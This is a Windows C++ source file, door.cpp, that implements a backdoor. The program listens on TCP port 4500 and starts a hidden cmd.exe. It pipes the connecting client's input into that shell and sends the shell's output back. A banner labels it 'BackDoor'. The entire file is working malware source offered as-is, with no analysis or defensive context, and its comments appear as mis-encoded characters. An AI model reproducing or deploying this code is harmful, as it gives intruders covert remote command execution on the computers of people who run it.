// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

SOCKET sListen,sClient;
//����ܵ����
HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;

//����Զ�������������д��ܵ�2
DWORD WINAPI Thread2( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD nByteToWrite, nByteWritten;
	char recv_buff[1024];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//�����ܵ�
	CreatePipe(&hReadPipe,&hWriteFile,&sa,0);
	while(true)
	{
		Sleep(250);
		//����Զ��cmd����
		nByteToWrite = recv(sClient ,recv_buff,1024,0);
		//д��ܵ�
		WriteFile(hWriteFile,recv_buff,nByteToWrite,&nByteWritten,NULL);
	}
	return 0;
}

//��ȡ�ܵ�1�е����ݣ����ظ�Զ������
DWORD WINAPI Thread1( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD len;
	char send_buff[2048];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
    CreatePipe(&hReadFile,&hWritePipe,&sa,0);
	while (true)
	{
		//��ȡ�ܵ��е�����
		ReadFile(hReadFile,send_buff,2048,&len,NULL);
		//�ѹܵ��е����ݷ��͸�Զ������
        send(sClient,send_buff,len,0);
	}
	return 0;
}

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by �����ѩ  ========================\r\n";
    HANDLE hThread[2];
	DWORD dwThreadIdA,dwThreadIdB;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
    //��ʼ��socket�����󶨱��ض˿ڼ���
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	if(listen(sListen, 2) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	//��������
	sClient = accept(sListen, NULL, NULL);
	//�����������̣����ڶ�ȡд��ܵ��е����ݣ�ʵ��ͨ��
	hThread[0]=CreateThread(NULL, 0, Thread1, NULL, 0, &dwThreadIdA);
	hThread[1]=CreateThread(NULL, 0, Thread2, NULL, 0, &dwThreadIdB);
	//��ͣ1��,Ϊ��ȷ�������߳��еĹܵ�������ϣ���Ϊ����Ҫ�Թܵ����в���
    Sleep(1000);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	//ʹcmd����������͹ܵ�����
	si.hStdInput = hReadPipe;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = SW_HIDE;
	char cmdline[256]={0};
	//�õ�ϵͳ·��
	GetSystemDirectory(cmdline,sizeof(cmdline));
    strcat(cmdline,"\\cmd.exe");
	//����cmd����
	if (CreateProcess(cmdline, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0)
	{
		printf ("CreateProcess Error \n");
		return 0;
	} 
	//���ͻ�ӭ��Ϣ
	send(sClient ,wMessage,strlen(wMessage),0);
	//�ȴ��߳̽���
	WaitForMultipleObjects(2,hThread,true,INFINITE);  
	return 0;
}
